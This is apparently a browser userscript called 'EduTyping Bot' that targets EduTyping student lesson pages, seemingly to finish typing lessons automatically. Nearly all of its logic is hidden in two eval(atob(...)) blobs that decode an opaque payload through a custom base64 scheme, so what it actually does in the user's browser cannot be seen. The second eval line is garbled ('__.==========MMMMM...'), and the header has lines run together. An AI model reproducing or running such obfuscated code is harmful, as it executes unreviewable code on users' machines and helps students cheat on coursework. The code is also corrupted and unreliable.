// ==UserScript==
// @name         EduTyping Bot (Script)
// @namespace    https://www.theprabhakar.in/
// @version      1.0
// @description  Browser counterpart of EduTyping Bot
// @author       Prabhakar Rai
// @match        https://www.edutyping.com/student/lesson/*
// @icon         https://github.com/PrabhakarRai/EduTyping-Auto-Bot/raw/main/icon.png
// @updateURL    https://github.com/PrabhakarRai/EduTyping-Auto-Bot/raw/main/eduTypingScript.user.js// @grant        unsafeWindow
// @grant        GM_addStyle
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_registerMenuCommand
// @grant        GM_listValues
// @grant        GM_getResourceText
// @grant        GM_getResourceURL
// @grant        GM_log
// @grant        GM_setClipboard
// @grant        GM_info
// ==/UserScript==

var nl = '\u23ce';
var tb = '\u21C9';
eval(atob('dmFyIHU9dm9pZCAwLGk0PTQsaTg9OCxyZWM9bmV3IFJlZ0V4cCgiLnsxLDR9IiwiZyIpO2Z1bmN0aW9uIF9mX2Mocyl7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUocyk7fXZhciBoZD1mdW5jdGlvbihhKXt2YXIgYixjPWEubWF0Y2gocmVjKXx8W10sZD0iIjtmb3IoYj0wO2I8Yy5sZW5ndGg7YisrKWQrPWhoKHBhcnNlSW50KGNbYl0saTYpKTtyZXR1cm4gZH07dmFyIGh3PWhkO1N0cmluZy5wcm90b3R5cGUuY2M9ZnVuY3Rpb24oYSl7cmV0dXJuIHRoaXMuY2hhckNvZGVBdChhKX07dmFyIGk2PTE2LGhlPWZ1bmN0aW9uKGEpe3ZhciBiLGMsZD0iIjtmb3IoYz0wO2M8YS5sZW5ndGg7YysrKWI9YS5jYyhjKS50b1N0cmluZyhpNiksZCs9KCIwMDAiK2IpLnNsaWNlKC00KTtyZXR1cm4gZH0saGg9ZnVuY3Rpb24oYSl7cmV0dXJuIFN0cmluZy5mcm9tQ2hhckNvZGUoYSl9LGh3YT1odygiMDA0MTAwNDIwMDQzMDA0NDAwNDUwMDQ2MDA0NzAwNDgwMDQ5MDA0YTAwNGIwMDRjMDA0ZDAwNGUwMDRmMDA1MDAwNTEwMDUyMDA1MzAwNTQwMDU1MDA1NjAwNTcwMDU4MDA1OTAwNWEwMDYxMDA2MjAwNjMwMDY0MDA2NTAwNjYwMDY3MDA2ODAwNjkwMDZhMDA2YjAwNmMwMDZkMDA2ZTAwNmYwMDcwMDA3MTAwNzIwMDczMDA3NDAwNzUwMDc2MDA3NzAwNzgwMDc5MDA3YTAwMzAwMDMxMDAzMjAwMzMwMDM0MDAzNTAwMzYwMDM3MDAzODAwMzkwMDJiMDAyZjAwM2QiKTtmdW5jdGlvbiBhdG9iKGEpe3ZhciBiLGMsZCxlLGYsZyxoLGk9IiIsaj0wO2ZvcihhPWEucmVwbGFjZShyZWEsIiIpO2o8YS5sZW5ndGg7KWU9aHdhLmluZGV4T2YoYS5jaGFyQXQoaisrKSksZj1od2EuaW5kZXhPZihhLmNoYXJBdChqKyspKSxnPWh3YS5pbmRleE9mKGEuY2hhckF0KGorKykpLGg9aHdhLmluZGV4T2YoYS5jaGFyQXQoaisrKSksYj1lPDwyfGY+PjQsYz0oMTUmZik8PDR8Zz4+MixkPSgzJmcpPDw2fGgsaSs9X2ZfYyhiKSw2NCE9ZyYmKGkrPV9mX2MoYykpLDY0IT1oJiYoaSs9X2ZfYyhkKSk7cmV0dXJuIGk9dXRvYShpKX1mdW5jdGlvbiBidG9hKGEpe3ZhciBiLGMsZCxlLGYsZyxoLGk9IiIsaj0wO2ZvcihhPWF0b3UoYSk7ajxhLmxlbmd0aDspYj1hLmNoYXJDb2RlQXQoaisrKSxjPWEuY2hhckNvZGVBdChqKyspLGQ9YS5jaGFyQ29kZUF0KGorKyksZT1iPj4yLGY9KDMmYik8PDR8Yz4+NCxnPSgxNSZjKTw8MnxkPj42LGg9NjMmZCxpc05hTihjKT9nPWg9NjQ6aXNOYU4oZCkmJihoPTY0KSxpPWkraHdhLmNoYXJBdChlKStod2EuY2hhckF0KGYpK2h3YS5jaGFyQXQoZykraHdhLmNoYXJBdChoKTtyZXR1cm4gaX1mdW5jdGlvbiBhdG91KGEpe2E9YS5yZXBsYWNlKHJlYiwiXG4iKTtmb3IodmFyIGI9IiIsYz0wO2M8YS5sZW5ndGg7YysrKXt2YXIgZD1hLmNoYXJDb2RlQXQoYyk7MTI4PmQ/Yis9X2ZfYyhkKTpkPjEyNyYmMjA0OD5kPyhiKz1fZl9jKGQ+PjZ8MTkyKSxiKz1fZl9jKDYzJmR8MTI4KSk6KGIrPV9mX2MoZD4+MTJ8MjI0KSxiKz1fZl9jKGQ+PjYmNjN8MTI4KSxiKz1fZl9jKDYzJmR8MTI4KSl9cmV0dXJuIGJ9ZnVuY3Rpb24gdXRvYShhKXtmb3IodmFyIGI9IiIsYz0wLGQ9YzE9YzI9MDtjPGEubGVuZ3RoOylkPWEuY2hhckNvZGVBdChjKSwxMjg+ZD8oYis9X2ZfYyhkKSxjKyspOmQ+MTkxJiYyMjQ+ZD8oYzI9YS5jaGFyQ29kZUF0KGMrMSksYis9X2ZfYygoMzEmZCk8PDZ8NjMmYzIpLGMrPTIpOihjMj1hLmNoYXJDb2RlQXQoYysxKSxjMz1hLmNoYXJDb2RlQXQoYysyKSxiKz1fZl9jKCgxNSZkKTw8MTJ8KDYzJmMyKTw8Nnw2MyZjMyksYys9Myk7cmV0dXJuIGJ9dmFyIGh3YT1odygiMDA0MTAwNDIwMDQzMDA0NDAwNDUwMDQ2MDA0NzAwNDgwMDQ5MDA0YTAwNGIwMDRjMDA0ZDAwNGUwMDRmMDA1MDAwNTEwMDUyMDA1MzAwNTQwMDU1MDA1NjAwNTcwMDU4MDA1OTAwNWEwMDYxMDA2MjAwNjMwMDY0MDA2NTAwNjYwMDY3MDA2ODAwNjkwMDZhMDA2YjAwNmMwMDZkMDA2ZTAwNmYwMDcwMDA3MTAwNzIwMDczMDA3NDAwNzUwMDc2MDA3NzAwNzgwMDc5MDA3YTAwMzAwMDMxMDAzMjAwMzMwMDM0MDAzNTAwMzYwMDM3MDAzODAwMzkwMDJiMDAyZjAwM2QiKSxyZWE9bmV3IFJlZ0V4cCgiW15BLVphLXowLTkrLz1dIiwiZyIpLHJlYj1uZXcgUmVnRXhwKCJcclxuIiwiZyIpO3ZhciBfXz17YTpod2Euc3BsaXQoIiIpLCQ6ZnVuY3Rpb24oYSxiKXtmb3IodmFyIGM9IiIsZD10aGlzLmEubGVuZ3RoLGU9YS5sZW5ndGgsZj0wO2Y8ZTtmKyspZm9yKHZhciBnPTA7ZzxkO2crKylpZigiZSI9PWIpe2lmKHRoaXMuYVtnXT09PWFbZl0pe2MrPXRoaXMuYltnXTticmVha319ZWxzZSBpZigiZCI9PWImJnRoaXMuYltnXT09PWFbZl0pe2MrPXRoaXMuYVtnXTticmVha31yZXR1cm4gY30sYjpodygiMDAzZDAwMmYwMDJiMDAzOTAwMzgwMDM3MDAzNjAwMzUwMDM0MDAzMzAwMzIwMDMxMDAzMDAwN2EwMDc5MDA3ODAwNzcwMDc2MDA3NTAwNzQwMDczMDA3MjAwNzEwMDcwMDA2ZjAwNmUwMDZkMDA2YzAwNmIwMDZhMDA2OTAwNjgwMDY3MDA2NjAwNjUwMDY0MDA2MzAwNjIwMDYxMDA1YTAwNTkwMDU4MDA1NzAwNTYwMDU1MDA1NDAwNTMwMDUyMDA1MTAwNTAwMDRmMDA0ZTAwNGQwMDRjMDA0YjAwNGEwMDQ5MDA0ODAwNDcwMDQ2MDA0NTAwNDQwMDQzMDA0MjAwNDEiKS5zcGxpdCgiIil9Ow=='));
eval(atob(__.==================MMMMMbfefeferjejrbjej3$('ja7O47DdkNLl4aHM4eQe3L0e1+39lO4U4Z/Rk+4U4aEZ4eQelcbS4eQekKzO4eQeoKUe1+3Mou4U4abd4eQelZvc4eQer6rN4eQekK0e1+4TjO4U4abS4eQeoZse1+3XlZse1+3WkOMe1+3ejpwe1+3Mj6Ee1+3dl+4U4anLla0e1+3RlZwe1+3bnu4U4aDJ4eQenqH+4eQe09Ye1+3b3O4U4avR4eQeoKDL4eQelJ3c4eQekOgZ4eQekOge1+3ajqHdj6bRle4U4ZjS4eQejKbSn6DJ4eQej6rN4eQemKbQ4eQekase1+3Rle4U4d=Q4eQelZwe1+3Sya0e1+4grace1+3Unu4U4ZvRle4U4ZzM1u4U4c3H4eQe1qPb4eQe1pvb4eQej6bTnu4U4eHWkO4U4ZvOlO4U4ZvMnu4U4anLlazMmqDS4eQeoq3N4eQeop0e1+3MmqLbiaDSnu4U4a7Xle4U4dXd4eQenaDO4eQen6se1+3alJ4e1+3NkKEe1+3XoO4U4bPS4eQelJse1+3M1q0e1+3dl6cepuPhnN=D4e4FnZrSoJvXlKIgpKoP2+bFja7O450Dn6DdjqLblZwSnKrMvqPblqrSj5z+iszUopzNta7TnufhoJzl0t3j2LDdkLUNy7MVpKzNqN4LpuThoJzlztnj2LDdkLUHpuThoJzl0tzj2LDdkLUN07MXyJ0Sl6rSnJvYx98a3efNxqvRoJrTnqHM1ajbj8rUnqLblZvNwZb9l67NkMHflqsYpKzNqNnj2LDdkLUO0LMVpKzNqNrj2LDdkLUL0bMVpKzNqNwIpuThoJzlztzj2O3O4ecX17DZ09LhoJzl0t7j2O3M4dTalJ4Yja7O460D4e4UpNMQyLEEkOHUnqHZj6gFpOUV2pTdxpzlpLMSmqHSnp3snpfMyKnRkefKop4gntMQyKsEoOHUnqHZj6gFnuUV2qzlnrMDxqHUxLDZ0+UD4ZIeyazlnrMDxpvexOfhnN=DpKkQ1ZzLoZzMkabSnOgQ17DZ0+HUnqHZj6gT0ucUpKkQ2NMeo+4UnuUV16sV2OcGoLTbpu8DpKzNqNoLpuoa27DZ0+UDoLTbpubDvMLhkKrMwKPXk63Rop3c27DZ0+bDnZrSoJvXlKIgpKoQ2+bFkKrMr6bTnqDLj+gYnZrSoJvXlKIY2pTXnefclKzLlqrSj+HPjqrOirzbl6rdj6DO27DdkLUL0rMVpKzNqNwHpuThoJzlz9nj2LDdkLUOyrMVpKzNqN8QpuThoJzl0dvj2O3S4ecXiJnfke/NxqvRoJrTnqHM1ajbj8rUnqLblZvNwZb9l67NkMHflqsYpKzNqN8JpuThoJzl0Nnj2LDdkLUKzLMVpKzNqNoKpuThoJzl07MVpKzNqN4IpuThoJzl0Nvj2rUQpuHXlaHbkbvbi5wFkO8DpKzNqN4KpuThoJzlz9/j3en5trDNnpv9l6bQoaDfkawYkObDhucU0N8Q0+cUkKrMr6bTnqDLj+gYnZrSoJvXlKIY2pThnd8Y2pMX19vb0ObD1t8fxpjXlavRjOHUlKzfj6bRleHYkara1Zzbop3dm+fhoJzlz9vj2LDdkLUK0LMV4aIe2uoa25zbj8bSj6rOja7U2+fajqHdj6bRlegXiOwYpKzNqN8LpuThoJzl0tbj2LDdkLUM0bMVpKzNqN0HpuThoJzly7MVpKzNqN8MpuThoJzl0N3j2LDdkLUPpuThoJzl0Njj2LDdkLUM0LMVpKzNqNoPpuThoJzlz7MV4ece2uHMkabZnKrO27DdkLUKy7MVpKzNqNjj2uQc27DdkLUPy7MVpKzNqNwLpuThoJzlztbj2LDdkLUO0bMVpKzNqNsIpuThoJzl0N7j2LDdkLUOpuThoJzlz97j2LDdkLUPzbMVpKzNqN4JpuUe2u4X1ZvOmqjZnp4YpKzNqN4QpuThoJzlzdvj2O3V4ebD2uQNnt0X15jXlavRjOHRlaPRoqwDpKoQ2+cXyQAA','d')));
